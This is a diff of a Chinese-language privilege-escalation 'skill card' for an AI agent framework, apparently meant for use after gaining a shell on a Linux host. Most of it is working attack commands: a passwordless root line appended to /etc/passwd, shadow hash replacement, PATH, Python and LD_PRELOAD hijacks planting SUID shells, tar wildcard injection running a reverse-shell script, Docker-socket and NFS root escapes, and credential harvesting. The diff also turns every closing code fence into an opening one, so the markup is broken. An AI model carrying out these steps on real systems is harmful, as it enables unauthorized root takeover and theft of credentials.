@@ -4,11 +4,10 @@ description: 'Linux 提权技能：2026 通杀 CVE（Copy Fail/Dirty Frag）+ �
 whenToUse: '拿到 Linux shell 后提权：2026 通杀 CVE + 容器检测 + 8 阶段检查表。'
 metadata: { domain: linux, tier: T1 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # Linux 提权技能
 
-> 🔴 **不自动加载。拿 shell 后调用 `加载技能 linux-privesc`，先读此索引匹配场景。**
+> 🔴 **不自动加载。拿 shell 后用 skill 工具按名加载本卡，先读此索引匹配场景。**
 
 ## 快速索引
 
@@ -16,11 +15,11 @@ metadata: { domain: linux, tier: T1 }
 |------|------|
 | 刚拿 shell，什么都不知道 | §0 容器检测 (必须先做) → §2 基础信息 |
 | 内核版本已知 | §1 通杀 CVE: Copy Fail (4.14-7.0) / Dirty Frag (4.x-6.x) / OverlayFS |
-| `sudo -l` 有结果 | §2 Sudo: CVE-2026-53225 / 已知 sudo 二进制绕过 |
+| `sudo -l` 有结果 | §3 Sudo: CVE-2026-53225 / 已知 sudo 二进制绕过 |
 | 有 capabilities | §3 Capabilities 滥用 |
-| 有 SUID 二进制 | §4 SUID: 共享库劫持 / PATH 劫持 / 通配符 |
-| 有 cron/systemd timer | §5 Cron/Systemd Timer 劫持 |
-| 有可写目录/文件 | §6 文件权限: /etc/passwd / authorized_keys / NFS |
+| 有 SUID 二进制 | §9 SUID: 共享库劫持 / PATH 劫持 / 通配符 |
+| 有 cron/systemd timer | §9 Cron/Systemd Timer 劫持 |
+| 有可写目录/文件 | §5 文件权限: /etc/passwd / authorized_keys / NFS |
 | 有 MySQL/PostgreSQL root | 数据库提权见 mysql-udf-privesc / postgresql-rce 卡 |
 | 是容器环境 | → 加载 `container-escape` |
 | 是 snap/flatpak/firejail | → 加载 `noncontainer-sandbox-escape` |
@@ -28,7 +27,7 @@ metadata: { domain: linux, tier: T1 }
 
 ## 0. 容器环境检测（拿 shell 第一毫秒！）
 
-```
+```text
 [ ] cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|lxc|kubepods'
 [ ] ls -la /.dockerenv 2>/dev/null
 [ ] id | grep -E "docker|lxd|lxc"
@@ -40,12 +39,12 @@ metadata: { domain: linux, tier: T1 }
 [ ] flatpak list 2>/dev/null && echo "⚠️ FLATPAK → noncontainer-sandbox-escape"
 [ ] firejail --list 2>/dev/null && echo "⚠️ FIREJAIL → noncontainer-sandbox-escape"
 [ ] find / -perm -4000 -type f 2>/dev/null | grep -q snap-confine && echo "⚠️ snap-confine SUID → noncontainer-sandbox-escape"
-→ 命中 → 加载 noncontainer-sandbox-escape 记忆
-```
+→ 命中 → 加载 noncontainer-sandbox-escape 卡
+```text
 
 ## 1. 2026 通杀内核提权（优先！）
 
-```
+```text
 [ ] 🔴 前提: cat /proc/sys/kernel/unprivileged_userns_clone  → 必须为 1
     如果为 0 且有 root 权限可: sysctl kernel.unprivileged_userns_clone=1
     如果为 0 且无 root → 内核提权不可行，跳过本阶段
@@ -65,18 +64,18 @@ metadata: { domain: linux, tier: T1 }
 [ ] 🆕 内核版本在 2015-2021 区间? → 先试 OverlayFS CVE-2021-3493 / CVE-2023-0386
     检测: unshare -rm sh -c "echo ok" 2>&1 | grep -q ok && echo "VULN: user_ns available"
     不熟版本匹配 → 用 linux-exploit-suggester 自动匹配内核 CVE
-```
+```text
 
 ## 2. 基础信息
-```
+```text
 [ ] id; whoami; uname -a; cat /etc/os-release
 [ ] pkexec --version 2>/dev/null                 # PwnKit CVE-2021-4034 (几乎所有旧发行版)
 [ ] env; cat /proc/1/environ | tr '\0' '\n'     # 🔴 环境变量第一站！
 [ ] sudo -V | head -1
-```
+```text
 
 ## 3. 快速提权
-```
+```text
 [ ] sudo -l                                       # 🔴 最优先！→ 每条 sudo 规则去 GTFOBins 查！
 [ ] 🔴 sudo -l 输出含 SETENV: → PYTHONPATH / PERL5LIB 变量注入！
     sudo PYTHONPATH=/tmp/ /allowed/script.py   # 在 /tmp/ 放同名 import 的 .py
@@ -95,10 +94,10 @@ metadata: { domain: linux, tier: T1 }
 [ ] 🆕 每个 root timer/cron 脚本 → cat 读源码 → 找 os.path.join / git ls-tree / subprocess
 [ ] cat /etc/exports                               # NFS no_root_squash (见 §9.9)
 [ ] id | grep -E "docker|lxd|disk|adm"             # 🔴 高危组！(见 §9.7)
-```
+```text
 
 ## 4. 进程 & 服务
-```
+```text
 [ ] ps aux; ss -ntlp                              # 内网服务（尤其 127.0.0.1）
 [ ] 🔴 localhost 服务快速检查:
     ss -ltnp | grep 127.0.0.1 → 每个端口都是独立攻击面
@@ -111,10 +110,10 @@ metadata: { domain: linux, tier: T1 }
 [ ] strings /dev/mem -n10 2>/dev/null | grep -i pass
 [ ] 🔴 pspy — 无 root 权限监控进程: ./pspy64 -pf -i 1000  # 观察 cron/timer 实际执行了什么命令
 [ ] 🆕 systemctl list-timers → 每个 root timer → cat 对应脚本 → 找: os.path.join, git ls-tree, subprocess, shutil.copy
-```
+```text
 
 ## 5. 文件 & 目录
-```
+```text
 [ ] find / -writable -type f 2>/dev/null | grep -v proc
 [ ] find / -name "*.env" -o -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null | grep -v proc
 [ ] grep -r "password\|secret\|key" /etc/ /opt/ /var/ 2>/dev/null | head -20
@@ -125,17 +124,17 @@ metadata: { domain: linux, tier: T1 }
 [ ] cat /etc/passwd /etc/shadow 2>/dev/null                   # 🔴 检查是否可写！
     → passwd 可写 → echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd → su root2
     → shadow 可写 → openssl passwd -1 newpass → 替换 root 的 hash
-```
+```text
 
 ## 6. 已安装软件
-```
+```text
 [ ] dpkg -l; rpm -qa
 [ ] 每个版本号 → searchsploit
 [ ] 🔴 优先级: sudo > polkit > snapd > Docker
-```
+```text
 
 ## 7. 已知 CVE 对照
-```
+```text
 🔴 2026: Copy Fail (CVE-2026-31431), Dirty Frag (CVE-2026-43284), Fragnesia (CVE-2026-46300)
 🔴 OverlayFS: CVE-2021-3493 (Ubuntu 20.04/21.04), CVE-2023-0386 (Ubuntu 22.04/22.10)
 经典: PwnKit (CVE-2021-4034), Baron Samedit (CVE-2021-3156), DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
@@ -144,20 +143,20 @@ metadata: { domain: linux, tier: T1 }
 🆕 udisks2: CVE-2025-6019 (XFS resize race → SUID shell)
 🆕 PAM: CVE-2025-6018 (.pam_environment → allow_active bypass)
 🆕 Sudo: CVE-2025-32463 (<1.9.16), CVE-2023-22809 (sudoedit ≤1.9.12p2)
-```
+```text
 
 ## 8. 密码 & 凭据
-```
+```text
 [ ] env; cat /proc/1/environ | tr '\0' '\n'
 [ ] ~/.bash_history; /root/.bash_history
 [ ] ~/.ssh/id_rsa; /root/.ssh/id_rsa
 [ ] 🔴 每个密码 → 试 SSH / sudo / su
-```
+```text
 
 ## 9. 🆕 SUID / Cron 利用链（HTB 经典提权）
 
 ### 9.1 SUID Binary 分析
-```
+```text
 # 找到 SUID binary 后，不是直接放弃 — 分析它做了什么
 strings /path/to/suid_binary                          # 看它调了哪些命令
 strace /path/to/suid_binary 2>&1 | grep execve        # 看实际 exec 调用
@@ -166,10 +165,10 @@ ltrace /path/to/suid_binary 2>&1 | grep -E "system|exec|popen"
 🔴 关键模式: binary 调了不带绝对路径的命令 → PATH 劫持
 🔴 关键模式: binary 是 Python 脚本 → 库劫持
 🔴 关键模式: binary 在可写目录执行 tar/tar.gz 操作 → wildcard 注入
-```
+```text
 
 ### 9.2 PATH 劫持
-```
+```text
 # 条件: SUID binary 调了不带绝对路径的命令 (如 cat / id / backup)
 # 利用: 在 PATH 前面放恶意同名文件
 
@@ -180,10 +179,10 @@ export PATH=/tmp:$PATH
 /path/to/suid_binary                                # 以 root 执行 → spawn root shell
 
 # 常见目标命令: cat, id, ls, cp, mv, tar, gzip, systemctl, service, backup, cleanup
-```
+```text
 
 ### 9.3 Python 库劫持
-```
+```text
 # 条件: root cron 或 SUID binary 执行 python3 /path/to/script.py
 # 且你对 script 所在目录有写权限
 
@@ -195,10 +194,10 @@ echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash")' \
 
 # Python 优先搜索当前脚本目录 → 先于系统库加载
 # 🔴 验证: python3 -c "import sys; print(sys.path)" → 看搜索顺序
-```
+```text
 
 ### 9.4 Wildcard 注入（cron 用 tar 备份）
-```
+```text
 # 条件: cron 在可写目录执行 tar cf /backup/xxx.tar * (不带 --)
 # 利用: 创建文件名为 tar 选项的文件
 
@@ -213,10 +212,10 @@ touch -- "--checkpoint-action=exec=sh /tmp/rev.sh"
 
 # 🔴 检测: ls -la | grep '^-'  → 文件名以 - 开头说明已有注入痕迹
 # 🔴 防御侧: tar cf backup.tar ./* (用 ./* 而非 * 避免 -- 文件)
-```
+```text
 
 ### 9.5 常见 SUID 利用速查
-```
+```text
 # SUID find    → find . -exec /bin/bash -p \; -quit
 # SUID python  → python -c 'import os; os.execl("/bin/bash","bash","-p")'
 # SUID bash    → /bin/bash -p
@@ -225,10 +224,10 @@ touch -- "--checkpoint-action=exec=sh /tmp/rev.sh"
 # SUID systemctl → 创建恶意 service → systemctl start
 # SUID cp/mv   → 覆盖 /etc/passwd /etc/sudoers
 # SUID tar     → tar cf - /etc/shadow 2>/dev/null | tar xf - -O
-```
+```text
 
 ### 9.6 Shared Object / Library 劫持
-```
+```text
 # 条件: SUID binary → ldd 确认 + 依赖路径可写 或 LD_PRELOAD env_keep
 
 # ① 找缺失的 .so (最理想)
@@ -249,10 +248,10 @@ ldd /path/to/suid_binary
 
 # ③ LD_PRELOAD (sudo -l 含 env_keep+=LD_PRELOAD)
 # 同上恶意 .so → sudo LD_PRELOAD=/tmp/libhijack.so /allowed/command
-```
+```text
 
 ### 9.7 Groups Abuse（高危组成员利用）
-```
+```text
 # 🔴 Writable Docker socket (不需要 docker 组!)
 [ ] ls -la /var/run/docker.sock 2>/dev/null
     → 可写 → docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
@@ -278,10 +277,10 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
 # 🆕 screen/tmux 残留 session (attached 即 root)
 screen -ls 2>/dev/null; tmux ls 2>/dev/null
 # → screen -x root/ 或 tmux attach → 直接拿到 root shell
-```
+```text
 
 ### 9.8 systemd Service / Timer 劫持
-```
+```text
 # 条件: 可写 root systemd service 或 timer 文件 (/etc/systemd/system/ 或 /usr/lib/systemd/system/)
 
 # ① 列出 timer → 找到 timer 对应的 service
@@ -303,10 +302,10 @@ systemctl list-timers --all
 
 # 🔴 优先检查: /etc/systemd/system/*.service → 是否 www-data/普通用户可写
 # 🔴 HTB 经典: cron 间接调 systemctl start → service 文件中 ExecStart 可写
-```
+```text
 
 ### 9.9 NFS no_root_squash
-```
+```text
 # 条件: cat /etc/exports 有 no_root_squash + 攻击机可达 NFS
 
 # 攻击机以 root 挂载
@@ -316,7 +315,7 @@ mount -t nfs -o rw,vers=3 <NFS_SERVER>:/export /mnt/nfs
 cp /bin/bash /mnt/nfs/bash && chmod 4755 /mnt/nfs/bash
 
 # 🔴 如果 exports 限制 IP 段 → 检查跳板机/VPN 是否在允许段内
-```
+```text
 
 ## 快速优先级
 | 优先级 | 项 | 命令 |
